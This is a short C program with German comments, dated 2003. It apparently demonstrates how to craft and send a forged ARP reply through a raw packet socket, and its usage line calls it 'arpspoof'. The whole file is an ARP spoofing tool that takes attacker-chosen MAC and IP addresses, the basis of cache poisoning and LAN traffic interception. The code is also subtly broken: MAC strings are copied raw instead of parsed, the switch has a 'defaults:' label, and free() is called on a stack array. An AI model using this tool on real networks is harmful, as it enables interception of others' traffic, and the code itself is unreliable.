/*

Beispiel Code um ein ARP Reply Packet ohne Libnet zu 
erstellen und auf die Reise zu schicken.

By Bastian Ballmann
16.08.2003

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Man pages zum Thema:

man 2 socket
man 2 setsockopt
man 7 raw
man 7 ip
man 7 arp

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

*/

// Includes
#include <stdio.h>           // Standard I/O Funktionen wie printf()
#include <stdlib.h>          // Standard Funktionen wie exit() und malloc()
#include <string.h>          // String und Memory Funktionen wie strcmp() und memset()
#include <getopt.h>          // Parsing Parameter
#include <errno.h>           // Detailliertere Fehlermeldungen
#include <sys/socket.h>      // Socket Funktionen wie socket(), bind() und listen()
#include <net/ethernet.h>    // Ethernet Header Struktur
#include <arpa/inet.h>       // in_addr Struktur

#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2
#define ARPHDR_ETHER 1
#define ETH_ALEN 6

// ARP Header Struktur
struct arphdr {
   u_short hw_type;           // hardware type
   u_short proto_type;        // protocol type
   char ha_len;               // hardware address len
   char pa_len;               // protocol address len
   u_short opcode;            // arp opcode
   char source_add[6];        // source mac
   char source_ip[4];         // source ip
   char dest_add[6];          // dest mac
   char dest_ip[4];           // dest ip
};

void usage(void);

// Main part
int main(int argc, char *argv[])
{
  int sock, uid;
  struct sockaddr addr;
  char c;
  char *opts = "d:i:m:s:t:";
  unsigned int packetsize = sizeof(struct arphdr) + sizeof(struct ether_header);
  unsigned char packet[packetsize];
  struct ether_header *ethhdr = (struct ether_header *)packet;
  struct arphdr *arp = (struct arphdr *)(packet + sizeof(struct ether_header));
  char smac[18], dmac[18];
  char sip[18], dip[18];
  char dev[6];

  // Are you root?
  uid = getuid();
  if(uid != 0) { printf("You must have UID 0 instead of %d.\n",uid); exit(1); }

  // Parameter verarbeiten
  if(argc < 6) { usage(); }

  while( (c = getopt(argc,argv,opts)) != -1)
    {
      switch(c)
	{
	case 'd':
	  strncpy(dip,optarg,18);
	  break;

	case 'i':
	  strncpy(dev,optarg,6);
	  break;

	case 'm':
	  strncpy(smac,optarg,18);
	  break;
	
	case 's':
	  strncpy(sip,optarg,18);
	  break;

	case 't':
	  strncpy(dmac,optarg,18);
	  break;

        defaults:
	  usage();
	}
    }

  // Packet Buffer initialisieren
  memset(packet,0,packetsize);

  // Erstelle einen Socket Deskriptor
  if( ( sock = socket(AF_INET,SOCK_PACKET,htons(ETH_P_ARP))) == -1 ) { perror("socket"); exit(1); }
  
  // Ethernet Header Optionen
  memcpy(ethhdr->ether_dhost,dmac,ETHER_ADDR_LEN); // Destination MAC
  memcpy(ethhdr->ether_shost,smac,ETHER_ADDR_LEN); // Source MAC
  ethhdr->ether_type = htons(ETHERTYPE_ARP);       // ARP Protokoll
  
  // ARP Header Optionen
  arp->hw_type = htons(ARPHDR_ETHER);                    // Hardware Address Typ
  arp->proto_type = htons(ETH_P_IP);                     // Protokoll Address Typ
  arp->ha_len = 6;                                       // Hardware Address Laenge
  arp->pa_len = 4;                                       // Protokoll Address Laenge
  arp->opcode = htons(ARPOP_REPLY);                      // ARP OP Typ
  memcpy(arp->source_add,smac,ETH_ALEN);                 // Sender MAC
  *(u_long *)arp->source_ip = inet_addr(sip);            // Source IP
  memcpy(arp->dest_add,dmac,ETH_ALEN);                   // Target MAC
  *(u_long *)arp->dest_ip = inet_addr(dip);              // Target IP

  // Schicke das Paket auf die Reise  
  strncpy(addr.sa_data,dev,sizeof(addr.sa_data));

  printf("Sending ARP packet\n");
  if( (sendto(sock,packet,packetsize,0,&addr,sizeof(struct sockaddr))) == -1 )
    {
      perror("send");
      exit(1);
    }

  // Speicher fuer Packet Buffer deallozieren
  free(packet);
  return 0;
}


void usage(void)
{
  printf("Usage: arpspoof -i <dev> -m <source_mac> -s <source_ip> -t <dest_mac> -d <dest_ip>\n");
  exit(0);
}
